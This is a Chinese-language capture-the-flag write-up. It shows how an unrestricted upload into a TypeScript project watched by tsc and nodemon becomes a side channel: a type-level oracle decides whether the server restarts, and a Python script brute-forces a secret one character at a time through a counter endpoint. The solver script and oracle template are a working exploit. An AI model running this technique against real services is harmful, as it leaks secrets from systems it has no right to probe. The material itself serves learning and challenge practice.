# Upload, Upload, and Away!

## 题目简述

站点允许向项目的 `images/` 目录上传任意文件，并通过 `/filecount` 返回当前进程记录的上传次数。服务启动命令同时运行 `tsc -w` 和 `nodemon dist/index.js`，而源码导出了字面量类型的 flag。目标不是读取上传目录，而是让 TypeScript 编译结果控制 Node 进程是否重启，把 `fileCount` 变成逐字符侧信道。

## 解题过程

上传处理没有限制扩展名，文件会保留原始 basename：

```typescript
const imagesDir = path.join(__dirname, "../images");

const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, imagesDir),
  filename: (_req, file, cb) => cb(null, path.basename(file.originalname)),
});
```

因为 `tsconfig.json` 没有设置 `include` 或排除 `images/`，上传的 `.ts` 文件也会被 `tsc -w` 编译。项目同时配置：

```json
{
  "compilerOptions": {
    "noEmitOnError": true,
    "outDir": "dist"
  }
}
```

若上传代码可通过类型检查，编译器会写入 `dist/`，`nodemon` 随即重启服务器，全局变量 `fileCount` 回到 0；若类型检查失败，`noEmitOnError` 阻止输出，进程不重启，上传计数保持非零。

`index.ts` 导出的是字符串字面量，而不是宽泛的 `string`：

```typescript
export const flag = "uiuctf{turing_complete_azolwkamgj}";
```

因此可以完全在类型系统中取第 $i$ 个字符，并在猜错时制造循环类型错误：

```typescript
import { flag } from "../index";

type CharAt<S extends string, I extends number, Seen extends unknown[] = []> =
  S extends `${infer Head}${infer Tail}`
    ? Seen["length"] extends I
      ? Head
      : CharAt<Tail, I, [...Seen, unknown]>
    : never;

type Guess = CharAt<typeof flag, __INDEX__> extends "__CHAR__"
  ? true
  : Guess;
```

猜对时 `Guess` 化简为 `true`，编译成功并触发重启；猜错时 `Guess` 自引用，编译失败。下面的脚本对每个位置覆盖同一个 `solve.ts`，再观察进程是否重启。实际环境应适当放宽等待时间，避免把编译延迟误判为错误字符。

```python
import string
import time
import requests

base = "https://TARGET"
alphabet = string.ascii_lowercase + "{}_"
template = open("oracle-template.ts", encoding="utf-8").read()

def restarted():
    for _ in range(20):
        time.sleep(0.25)
        if requests.get(f"{base}/filecount").json()["file_count"] == 0:
            return True
    return False

flag = ""
for index in range(64):
    for char in alphabet:
        source = template.replace("__INDEX__", str(index)).replace(
            "__CHAR__", char
        )
        requests.post(
            f"{base}/upload",
            files={"file": ("solve.ts", source, "application/typescript")},
        )
        if restarted():
            flag += char
            print(flag)
            break
    else:
        raise RuntimeError(f"position {index} not recovered")
    if flag.endswith("}"):
        break
```

恢复结果为：

```text
uiuctf{turing_complete_azolwkamgj}
```

题目配置中还登记了一个备用可接受 flag，但仓库里的实际源码常量和官方类型侧信道脚本对应的是上面的结果。

## 方法总结

- 核心技巧：把 TypeScript 类型检查成功与否转换成“是否生成文件”，再利用 nodemon 重启导致的内存计数清零作为一位 oracle。
- 识别信号：用户可写入编译器监视范围，构建配置启用 `noEmitOnError`，运行时又由文件监视器自动重启，这三者组合会形成构建侧信道。
- 复用要点：逐字符探测要覆盖同一文件、等待编译稳定并以右花括号终止；固定使用示例假 flag 的长度会过早停止。
